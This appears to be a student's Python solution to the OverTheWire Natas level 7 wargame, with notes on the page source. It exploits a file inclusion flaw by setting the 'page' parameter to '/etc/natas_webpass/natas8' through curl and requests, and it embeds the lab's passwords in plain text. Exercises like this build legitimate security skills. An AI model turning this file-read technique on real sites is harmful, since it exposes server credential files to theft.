# Natas Level 6 → Level 7
# Username: natas7
# URL:      http://natas7.natas.labs.overthewire.org



# it starts at this : http://natas7.natas.labs.overthewire.org/index.php


# View Page source  :

# <html>
# <head>
# <!-- This stuff in the header has nothing to do with the level -->
# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
# <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
# <script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
# <body>
# <h1>natas7</h1>
# <div id="content">

# <a href="index.php?page=home">Home</a>
# <a href="index.php?page=about">About</a>
# <br>
# <br>

# <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
# </div>
# </body>
# </html>


# ---------------------------------
# simple just paste the /etc/natas_webpass/natas8 in browser like below php pages concept

# view-source:http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8

# -------------------------------------------------
# <html>
# <head>
# <!-- This stuff in the header has nothing to do with the level -->
# <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
# <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
# <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
# <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
# <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
# <script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
# <body>
# <h1>natas7</h1>
# <div id="content">

# <a href="index.php?page=home">Home</a>
# <a href="index.php?page=about">About</a>
# <br>
# <br>
# xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

# <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
# </div>
# </body>
# </html>

# -----------------------------------------------------------------------------------
# you can't see the br tagged password on terminal cause its php/javascript based script in use while curl just fetches html



# ------------------------------------------------- Approach one
# import subprocess

# import sys

# import re

# def main():

#     # print("i am main")

#     command=''' curl -s -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS "http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8" '''

#     try:
#         # spawn the shell
#         result=subprocess.run(
#             command,
#             shell=True,
#             capture_output=True,
#             text=True,
#             check=True
#         )

#         if result.stdout:
#             # extract the natas 7 
#             # match=re.search(r'([A-za-z0-98]+)',result.stdout) #/// this don't workl think long you will figure it out
#             match=re.search(r'([A-Za-z0-9]{32})',result.stdout)  # this also just gives the pass of natas 7 we need for natas 8 that starts from letter x

#             print(result.stdout)
#             # print the stuff
#             print(match.group(0))   
#         else :
#             print("No result found")            
    
#     # error handling just inm case
#     except subprocess.CalledProcessError as e:
#         print(f"Command failed with exit code {e.returncode}")
#         if e.stderr:
#             print({f"Error : {e.stderr}"})
#         sys.exit(1) # need to exit the sppwasned shell
#     except FileNotFoundError :
#         print("error curl might not be installed ...")
#         sys.exit(1)

# if __name__=="__main__":
#     main()    


# ------------------------------------------------- Approach two

#  trying a simple approach with requests
import requests ,re # type: ignore

AUTH_USER = "natas7"
AUTH_PASS = "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS"
url="http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
params={
    "page":"/etc/natas_webpass/natas8"
}
resp=requests.get(url,params=params,auth=(AUTH_USER,AUTH_PASS))

text=resp.text

# print(text)

# m = re.search(r'([A-Za-z0-9]{20,40})',text) need to filter all passwords

m = re.findall(r'([A-Za-z0-9]{20,40})',text)

# print(m)

# now filter out from m
candidate=[ps for ps in m if ps!=AUTH_PASS ]

if candidate:
    print(f"Password for natas 8 is {candidate}")
else :
    print("Nope")    